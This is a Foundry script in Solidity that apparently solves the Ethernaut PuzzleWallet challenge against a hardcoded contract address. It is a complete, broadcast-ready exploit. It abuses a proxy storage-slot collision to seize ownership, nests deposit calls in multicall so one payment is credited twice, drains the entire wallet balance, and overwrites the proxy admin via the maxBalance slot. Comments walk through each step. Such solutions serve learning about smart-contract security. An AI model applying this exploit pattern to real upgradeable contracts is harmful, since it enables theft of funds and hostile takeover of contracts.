// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;
import { Script } from "forge-std/script.sol";
import { PuzzleWallet, PuzzleProxy } from "src/PuzzleWallet/PuzzleWallet.sol";

contract PuzzleWalletAttackScript is Script {
    address public puzzleWalletInstance = 0x02CFd9a4A158fd631981B6B5c63b4631a8C12Abe;

    bytes[] public depositData;
    bytes[] public multicallData;

    function run() public {
        PuzzleWallet wallet = PuzzleWallet(payable(puzzleWalletInstance));
        PuzzleProxy proxy = PuzzleProxy(payable(puzzleWalletInstance));

        vm.startBroadcast();

        // slot 0 collision:
        // Proxy:   address public pendingAdmin;
        // Wallet:  address public owner;
        proxy.proposeNewAdmin(msg.sender);
        wallet.addToWhitelist(msg.sender);
        // assert that we whitelisted our playerAddress
        assert(wallet.whitelisted(msg.sender));

        // prepare depositData for inclusion into multicallData
        depositData = [abi.encodeWithSelector(wallet.deposit.selector, "")];
        // call deposit first, then call multicall with a second deposit as an argument
        multicallData = [
            abi.encodeWithSelector(wallet.deposit.selector, ""),
            abi.encodeWithSelector(wallet.multicall.selector, depositData)
        ];

        // execute multicall with prepared multicall data above
        wallet.multicall{ value: 0.069 ether }(multicallData);

        // execute withdrawal of the entire wallet balance
        wallet.execute(msg.sender, address(wallet).balance, bytes(""));

        // affirm wallet has been cleared
        assert(address(wallet).balance == 0);
        
        // set new proxy admin via the maxBalance storage overlap
        // slot 1 collision:
        // Proxy:   address public admin;
        // Wallet:  uint256 public maxBalance;
        wallet.setMaxBalance(uint256(uint160(msg.sender)));

        // assert new owner
        assert(proxy.admin() == msg.sender);
        vm.stopBroadcast();
    }
}